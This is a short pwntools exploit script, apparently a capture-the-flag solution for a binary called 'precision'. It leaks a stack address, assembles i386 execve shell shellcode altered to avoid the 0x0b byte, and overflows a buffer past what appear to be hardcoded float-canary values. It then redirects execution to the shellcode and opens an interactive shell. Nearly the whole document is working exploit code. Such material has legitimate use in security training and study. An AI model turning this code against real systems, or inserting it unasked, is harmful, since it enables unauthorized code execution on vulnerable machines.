from pwn import *
import re, sys
context(arch='i386', os='linux', log_level='info')
r = process('./precision_a8f6f0590c177948fe06c76a1831e650')
saddr = r.recvuntil('\n')
sublen = 0x98
bufoff = 0x18
fldoff = sublen - bufoff
result = re.findall(r'Buff: 0x([a-f0-9]{8})', saddr)
if len(result) < 1: sys.exit(1)
saddr = result[0]
log.info('Leaked Stack Addr: {}'.format(saddr))

# Modified shellcode version without 0xb
sh = asm(shellcraft.i386.pushstr('/bin///sh'))
sh += asm(shellcraft.i386.mov('ebx','esp'))
sh += asm(shellcraft.i386.mov('ecx',0))
#sh += asm(shellcraft.i386.push('0xb')) # Original, following instruction replace this command
sh += asm(shellcraft.i386.mov('eax',0x41)) # eax = 0x41
sh += '\x83\xe8\x36' # sub eax, 0x36 83 == sub, e8 == eax, 36 == number to subtract
sh += '\x99' # cdq
sh += '\xcd\x80' # int 0x80

# Original shellcode version
# Does not work, because it contains a 0x0b see http://www.josho.org/blog/blog/2013/03/12/shellcode-whitespace/
#sh = asm(shellcraft.i386.linux.sh())

exploit = sh
exploit += "A"*(0x80-len(sh))
exploit = sh.ljust(fldoff,"A")
exploit += p32(0x475a31a5)
exploit += p32(0x40501555)
exploit += "B"*0xc
exploit += p32(int(saddr,16))
with open('in', 'wb') as f: f.write(exploit) # For gdb testing purposes
r.sendline(exploit)
junk = r.recvline()
log.info('Enjoy your shell :)!')
r.interactive()
